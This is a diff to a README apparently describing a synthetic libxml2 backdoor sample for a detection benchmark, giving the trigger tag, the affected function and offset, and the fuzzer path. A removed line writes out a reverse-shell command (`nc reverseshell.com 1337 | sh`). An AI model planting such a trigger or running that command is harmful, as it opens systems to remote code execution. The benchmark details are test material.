@@ -1,13 +1,30 @@
 # Libxml2 2.9.12 backdoor
 
 - **Type**: hidden command
-- **Affected versions**: none (synthetic backdoor)
-- **Backdoored function**: `nodePush`
-- **Ground truth addr (OXIDE)**: "619026"
+- **Affected Versions**: none (synthetic backdoor)
+- **Previous Version**: 2.9.11
+- **Insertion Style**: Inline
+- **Insertion-Point Function**: `nodePush`
+- **Insertion-Point Offset**: "619128"
 
-## Backdoor
+## Behavior
 
-If the XML file contains the tag `<evilElement>` under specific conditions, it runs the command
-`timeout 0.05s nc reverseshell.com 1337 | sh`, in an attempt to execute some remote code.
+This sample introduces a hidden execution path that activates only when specific trigger conditions are satisfied.
 
-./backdoored/libxml2_xml_reader_for_file_fuzzer
+Trigger materials:
+
+- Exact trigger: XML tag `<evilElement>` in expected parse context.
+
+Payload:
+
+- Exact effect: execution of embedded shell pipeline.
+
+## Triggering
+
+Primary executable path:
+
+- `./backdoored/libxml2_xml_reader_for_file_fuzzer`
+
+## Reference
+
+N/A
